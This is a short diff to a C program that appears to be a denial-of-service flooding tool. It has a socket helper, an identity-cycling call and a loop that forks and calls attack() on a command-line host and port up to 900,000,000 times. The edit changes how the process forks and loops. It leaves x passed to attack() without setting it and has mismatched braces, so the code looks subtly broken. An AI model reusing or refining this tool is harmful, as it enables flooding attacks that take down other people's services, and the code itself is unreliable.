@@ -13,6 +13,8 @@
 #include <arpa/inet.h>
 int buffer = 1024;
 #define PPS 900000000
+pid_t pid;
+int i;
 int make_socket(char *host, char *port) {
 	struct addrinfo hints, *servinfo, *p;
 	int sock, r;
@@ -91,8 +93,9 @@ int main(int argc, char **argv) {
 	int x;
 	if(argc !=3)
 		cycle_identity();
-	for(x=0; x != PPS; x++) {
-		if(fork())
+	fork();
+        pid = getpid();
+	for(i=1; i <= PPS; i++) {
 			attack(argv[1], argv[2], x);
 		usleep(200000);
 		
